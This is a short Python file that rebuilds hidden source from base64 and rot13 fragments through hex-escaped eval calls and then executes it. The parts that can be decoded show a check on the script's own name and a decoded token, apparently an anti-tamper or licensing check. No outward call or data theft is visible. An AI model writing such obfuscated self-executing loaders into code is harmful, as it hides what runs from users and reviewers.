# -*- coding: utf-8 -*-
import base64
import codecs
magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzeXMNCmZyb20gc2l4IGltcG9ydCBlbnN1cmVfdGV4dA0KDQoNCmRlZiBjaGsoKToNCiAgICBmaXggPSAnM2gzVms1R2J0Sm1ONGtIVDNoM1ZrNUdidEptWmFoVllyWmxNa'
love = 'IcgIIujoTSCMSMKZHbkIzSBFTW5omSvH05RIPphMJ5wo2EyXPq1qTLgBPpcQDbtVPNtMPN9VTWup2H2AP5vAwExMJAiMTHbLzSmMGL0YzV2ATEyL29xMFuznKuoBwbgZI0cXIf6Bv0kKD0XVPNtVTDtCFOyoaA1pzIsqTI4qPuxXF5lMKOfLJAyXPqsWljtWl'
god = '4nKQ0KICAgIGlmIHN5cy5hcmd2WzBdID09IGQ6DQogICAgICAgIHJldHVybiBUcnVlDQogICAgZWxzZToNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgc3lzLmV4aXQoKQ0KDQoNCnRrID0gZW5zdXJlX3RleHQoYmFzZTY0LmI2NGRlY29kZShiJ1pqVm1'
destiny = 'AE0I4GHqXnH56EGIBrxS3G0ESZx5HFzyAIRRlGxEwAH5dDGWBnzf9WlxcJmb6YGSqVTyzVTAbnltcVTIfp2HtWlpAPz9eVQ0tMJ5mqKWyK3EyrUDbLzSmMGL0YzV2ATEyL29xMFuvW1y6Fz1MIRccGxEICFpcXIf6Bv0kKFOcMvOwnTfbXFOyoUAyVPpaQDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')), '<string>', 'exec'))
